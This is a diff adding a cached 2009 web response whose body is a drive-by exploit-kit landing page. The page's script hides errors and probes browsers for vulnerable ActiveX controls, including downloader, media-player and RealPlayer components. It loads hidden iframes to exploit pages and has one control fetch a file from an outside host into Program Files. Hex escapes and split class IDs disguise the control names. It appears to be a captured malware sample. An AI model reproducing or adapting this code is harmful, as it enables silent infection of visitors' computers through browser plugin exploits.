@@ -1,0 +1,53 @@
+HTTP/1.1 200 OK
+Content-Length: 2187
+ETag: "54c5dbbec6a0c91:299"
+Date: Thu, 12 Mar 2009 07:05:40 GMT
+Last-Modified: Mon, 09 Mar 2009 14:53:02 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Polipo-Location: http://kghytgv.cn:6135/b094933/new.html
+X-Polipo-Date: Thu, 12 Mar 2009 07:13:40 GMT
+X-Polipo-Access: Wed, 18 Mar 2009 08:57:58 GMT
+
+<Script>
+document.write("<Iframe width=100 height=0 src=fx.htm></iframe>");
+document.write("");var sscs="lpc";
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<Iframe width=100 height=0 src=../14.htm></iframe>");
+try{var m;
+var hw=new ActiveXObject("\x44"+"\x6f\x77\x6e\x6c\x6f\x61\x64\x65\x72\x2e\x44\x4c\x6f\x61\x64\x65\x72\x2e\x31");}
+catch(m){};
+finally{if(m!="[object Error]"){document.write("<Iframe width=100 height=0 src=../as.htm></iframe>");}}
+try{var b;
+var ml=new ActiveXObject("MPS.StormPlayer");}
+catch(b){};                      
+finally{if(b!="[object Error]"){document.write("<Iframe width=100 height=0 src=../Bfyy.htm></iframe>");}}var sdddd="x";var sddqd="x";
+try{var f;
+var gw=new ActiveXObject("GLIEDown.IEDown.1");}
+catch(f){};                      
+finally{var dxl="x";if(f!="[object Error]"){document.write("<Iframe width=100 height=0 src=../lzz.htm></iframe>");}}var pqxl="d";
+try{var g;
+var pps=new ActiveXObject("UUUPGRADE.UUUpgradeCtrl.1")}
+catch(g){};
+finally{if(g!="[object Error]"){var url="http://l.bugxue.com/";pps=document.createElement("object");ActivePerl="-1"+"C59-4BBB-8E8";getSpraySlide="1-6E83F82C813B";helloworld2Address="clsid:2CACD7BB";pps.setAttribute("classid",helloworld2Address+ActivePerl+getSpraySlide);pps["Update"]("\\Program Files\\Common Files\\uusee\\",url+"UU.ini","",1)}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="\x36\x2e\x30\x2e\x31\x34\x2e\x35\x35\x32"){var ammc="dsvb";
+document.write('<Iframe style=display:none src="../real10.htm"></iframe>');}
+else
+document.write('<iframe style=display:none src="../real11.htm"></iframe>');
+}
+test();
+document.write("");document.write("");document.write("");document.write("");var fjd="fdsfsd";abc="dfdae";document.write("");var fkav="BS";var fkasaccv="BS";var fkaqfccv="BS";var fkfdccv="BS";var bcalv="BS";
+document.write("<Iframe width=100 height=0 src=../cx.htm></iframe>");
+</script>
+<script src=../new.js></script>
